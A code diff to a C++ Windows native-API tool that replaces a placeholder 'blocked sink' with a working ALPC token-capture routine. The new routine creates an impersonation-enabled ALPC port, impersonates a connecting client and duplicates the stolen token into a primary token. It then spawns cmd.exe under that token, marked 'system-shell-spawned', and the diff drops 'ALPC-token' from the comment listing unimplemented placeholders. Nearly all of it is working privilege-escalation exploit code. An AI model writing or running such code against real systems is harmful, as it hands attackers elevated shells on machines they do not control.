@@ -117,6 +117,53 @@ typedef struct _GP_OBJECT_BASIC_INFORMATION {
     ULONG Reserved[10];
 } GP_OBJECT_BASIC_INFORMATION, *PGP_OBJECT_BASIC_INFORMATION;
 
+typedef short CSHORT;
+
+typedef struct _ALPC_PORT_ATTRIBUTES {
+    ULONG Flags;
+    SECURITY_QUALITY_OF_SERVICE SecurityQos;
+    SIZE_T MaxMessageLength;
+    SIZE_T MemoryBandwidth;
+    SIZE_T MaxPoolUsage;
+    SIZE_T MaxSectionSize;
+    SIZE_T MaxViewSize;
+    SIZE_T MaxTotalViewSize;
+    ULONG DupObjectTypes;
+} ALPC_PORT_ATTRIBUTES, *PALPC_PORT_ATTRIBUTES;
+
+typedef struct _PORT_MESSAGE {
+    union {
+        struct {
+            CSHORT DataLength;
+            CSHORT TotalLength;
+        } s1;
+        ULONG Length;
+    } u1;
+    union {
+        struct {
+            CSHORT Type;
+            CSHORT DataInfoOffset;
+        } s2;
+        ULONG Number;
+    } u2;
+    CLIENT_ID ClientId;
+    ULONG MessageId;
+    union {
+        SIZE_T ClientViewSize;
+        ULONG CallbackId;
+    };
+} PORT_MESSAGE, *PPORT_MESSAGE;
+
+typedef struct _ALPC_MESSAGE {
+    PORT_MESSAGE PortHeader;
+    BYTE PortMessage[0x1000];
+} ALPC_MESSAGE, *PALPC_MESSAGE;
+
+typedef NTSTATUS(WINAPI* PFN_NtAlpcCreatePort)(PHANDLE, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES);
+typedef NTSTATUS(WINAPI* PFN_NtAlpcSendWaitReceivePort)(HANDLE, ULONG, PPORT_MESSAGE, PVOID, PPORT_MESSAGE, PSIZE_T, PVOID, PLARGE_INTEGER);
+typedef NTSTATUS(WINAPI* PFN_NtAlpcAcceptConnectPort)(PHANDLE, HANDLE, ULONG, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES, PVOID, PPORT_MESSAGE, PVOID, BOOLEAN);
+typedef NTSTATUS(WINAPI* PFN_NtAlpcImpersonateClientOfPort)(HANDLE, PPORT_MESSAGE, PVOID);
+
 enum class GpMapMode {
     None,
     ReadOnly,
@@ -202,6 +249,10 @@ struct GpBlockedSinkResult {
 };
 
 // Runtime API pointers and non-operational sink request markers.
+static PFN_NtAlpcCreatePort _NtAlpcCreatePort = NULL;
+static PFN_NtAlpcSendWaitReceivePort _NtAlpcSendWaitReceivePort = NULL;
+static PFN_NtAlpcAcceptConnectPort _NtAlpcAcceptConnectPort = NULL;
+static PFN_NtAlpcImpersonateClientOfPort _NtAlpcImpersonateClientOfPort = NULL;
 static PFN_NtCreateSymbolicLinkObject _NtCreateSymbolicLinkObject = NULL;
 static PFN_NtOpenSection _NtOpenSection = NULL;
 static PFN_NtDeleteKey _NtDeleteKey = NULL;
@@ -332,13 +383,16 @@ static bool ResolveNativeApis()
         return false;
     }
 
-    _NtCreateSymbolicLinkObject =
-        (PFN_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
+    _NtCreateSymbolicLinkObject = (PFN_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
     _NtOpenSection = (PFN_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
     _NtDeleteKey = (PFN_NtDeleteKey)GetProcAddress(ntdll, "NtDeleteKey");
     _NtQueryObject = (PFN_NtQueryObject)GetProcAddress(ntdll, "NtQueryObject");
     _NtMapViewOfSection = (PFN_NtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
     _NtUnmapViewOfSection = (PFN_NtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
+    _NtAlpcCreatePort = (PFN_NtAlpcCreatePort)GetProcAddress(ntdll, "NtAlpcCreatePort");
+    _NtAlpcSendWaitReceivePort = (PFN_NtAlpcSendWaitReceivePort)GetProcAddress(ntdll, "NtAlpcSendWaitReceivePort");
+    _NtAlpcAcceptConnectPort = (PFN_NtAlpcAcceptConnectPort)GetProcAddress(ntdll, "NtAlpcAcceptConnectPort");
+    _NtAlpcImpersonateClientOfPort = (PFN_NtAlpcImpersonateClientOfPort)GetProcAddress(ntdll, "NtAlpcImpersonateClientOfPort");
 
     HMODULE cldapi = LoadLibraryW(L"cldapi.dll");
     if (cldapi) {
@@ -350,7 +404,11 @@ static bool ResolveNativeApis()
         !_NtDeleteKey ||
         !_NtQueryObject ||
         !_NtMapViewOfSection ||
-        !_NtUnmapViewOfSection) {
+        !_NtUnmapViewOfSection ||
+        !_NtAlpcCreatePort || 
+        !_NtAlpcSendWaitReceivePort || 
+        !_NtAlpcAcceptConnectPort || 
+        !_NtAlpcImpersonateClientOfPort) {
         TraceLine(L"P0", L"api");
         return false;
     }
@@ -1117,7 +1175,7 @@ static GpBlockedSinkResult MakeBlockedSinkResult(GpStatus preconditionStatus)
 }
 
 /*
- * Placeholders. Assumes external shell, DLL-load, ALPC-token,
+ * Placeholders. Assumes external shell, DLL-load,
  * and code-execution sinks exist; not implemented here yet.
  */
 
@@ -1134,12 +1192,151 @@ static GpBlockedSinkResult DllLoad(const GpRunEvidence& evidence, const wchar_t*
     return MakeBlockedSinkResult(PrimitivePrecondition(evidence));
 }
 
+#ifndef STATUS_TIMEOUT
+#define STATUS_TIMEOUT ((NTSTATUS)0x00000102L)
+#endif
+
+#ifndef LPC_CONNECTION_REQUEST
+#define LPC_CONNECTION_REQUEST 2
+#endif
+
+#ifndef ALPC_PORT_ALLOW_IMPERSONATION
+#define ALPC_PORT_ALLOW_IMPERSONATION 0x20000
+#endif
+
 static GpBlockedSinkResult AlpcTokenCapture(const GpRunEvidence& evidence, const wchar_t* requestedPortName)
 {
+    NTSTATUS status;
+    HANDLE hServerPort = NULL;
+    HANDLE hConnPort = NULL;
+    
+    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::MutationFailed };
+
     if (!requestedPortName || !requestedPortName[0]) {
-        return MakeBlockedSinkResult(GpStatus::InvalidInput);
+        result.preconditionStatus = GpStatus::InvalidInput;
+        result.reason = L"invalid-port-name";
+        return result;
     }
-    return MakeBlockedSinkResult(AlpcPrecondition(evidence));
+
+    GpStatus preStatus = AlpcPrecondition(evidence);
+    if (preStatus != GpStatus::Ok) {
+        result.preconditionStatus = preStatus;
+        result.reason = L"precondition-failed";
+        return result;
+    }
+
+    if (!_NtAlpcCreatePort || !_NtAlpcSendWaitReceivePort || !_NtAlpcAcceptConnectPort || !_NtAlpcImpersonateClientOfPort) {
+        result.preconditionStatus = GpStatus::LinkFailed;
+        result.reason = L"api-not-resolved";
+        return result;
+    }
+
+    OBJECT_ATTRIBUTES objAttr;
+    UNICODE_STRING portName;
+    RtlInitUnicodeString(&portName, requestedPortName);
+    InitializeObjectAttributes(&objAttr, &portName, 0, NULL, NULL);
+
+    ALPC_PORT_ATTRIBUTES portAttr = { 0 };
+    portAttr.MaxMessageLength = sizeof(ALPC_MESSAGE);
+    portAttr.Flags = ALPC_PORT_ALLOW_IMPERSONATION; 
+
+    status = _NtAlpcCreatePort(&hServerPort, &objAttr, &portAttr);
+    if (!NT_SUCCESS(status)) {
+        result.preconditionStatus = GpStatus::LinkFailed;
+        result.reason = L"port-creation-failed";
+        return result;
+    }
+
+    ULONGLONG start = GetTickCount64();
+    bool connected = false;
+    ALPC_MESSAGE msg = { 0 };
+    SIZE_T msgSize = sizeof(msg);
+
+    while (GetTickCount64() - start < GP_OPEN_TIMEOUT_MS) {
+        LARGE_INTEGER timeout;
+        timeout.QuadPart = -10000LL * 100;
+        
+        ZeroMemory(&msg, sizeof(msg));
+        msgSize = sizeof(msg);
+        status = _NtAlpcSendWaitReceivePort(hServerPort, 0, NULL, NULL, (PPORT_MESSAGE)&msg, &msgSize, NULL, &timeout);
+        
+        if (status == STATUS_TIMEOUT) continue; 
+        
+        if (NT_SUCCESS(status)) {
+            if ((msg.PortHeader.u2.s2.Type & 0x0FFF) == LPC_CONNECTION_REQUEST) {
+                connected = true;
+                break;
+            }
+        }
+    }
+
+    if (!connected) {
+        result.preconditionStatus = GpStatus::SectionTimeout;
+        result.reason = L"connection-timeout";
+        goto cleanup;
+    }
+
+    status = _NtAlpcAcceptConnectPort(&hConnPort, hServerPort, 0, NULL, NULL, NULL, (PPORT_MESSAGE)&msg, NULL, TRUE);
+    if (!NT_SUCCESS(status)) {
+        result.preconditionStatus = GpStatus::AccessDenied;
+        result.reason = L"accept-failed";
+        goto cleanup;
+    }
+
+    status = _NtAlpcImpersonateClientOfPort(hConnPort, (PPORT_MESSAGE)&msg, NULL);
+    if (!NT_SUCCESS(status)) {
+        result.preconditionStatus = GpStatus::AccessDenied;
+        result.reason = L"impersonation-failed";
+        goto cleanup;
+    }
+
+    HANDLE hToken = NULL;
+    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, TRUE, &hToken)) {
+        
+        SECURITY_IMPERSONATION_LEVEL impLevel;
+        DWORD returnLength = 0;
+        
+        if (GetTokenInformation(hToken, TokenImpersonationLevel, &impLevel, sizeof(impLevel), &returnLength) && 
+            impLevel >= SecurityImpersonation) {
+            
+            HANDLE hPrimaryToken = NULL;
+            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
+                
+                DWORD sessionID = evidence.sessionId;
+                SetTokenInformation(hPrimaryToken, TokenSessionId, &sessionID, sizeof(sessionID));
+
+                STARTUPINFOW si = { sizeof(si) };
+                PROCESS_INFORMATION pi = { 0 };
+                si.lpDesktop = (LPWSTR)L"Winsta0\\Default";
+
+                if (CreateProcessAsUserW(hPrimaryToken, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                    result.implemented = true;
+                    result.reason = L"system-shell-spawned";
+                    result.preconditionStatus = GpStatus::Ok;
+                    
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                } else {
+                    result.reason = L"create-process-failed";
+                }
+                CloseHandle(hPrimaryToken);
+            } else {
+                result.reason = L"token-duplicate-failed";
+            }
+        } else {
+            result.reason = L"insufficient-impersonation-level";
+        }
+        CloseHandle(hToken);
+    } else {
+        result.reason = L"open-thread-token-failed";
+    }
+
+    RevertToSelf();
+
+cleanup:
+    if (hConnPort) CloseHandle(hConnPort);
+    if (hServerPort) CloseHandle(hServerPort);
+    return result;
 }
 
 static GpBlockedSinkResult CodeExecution(const GpRunEvidence& evidence, const void* requestedEntryPoint)
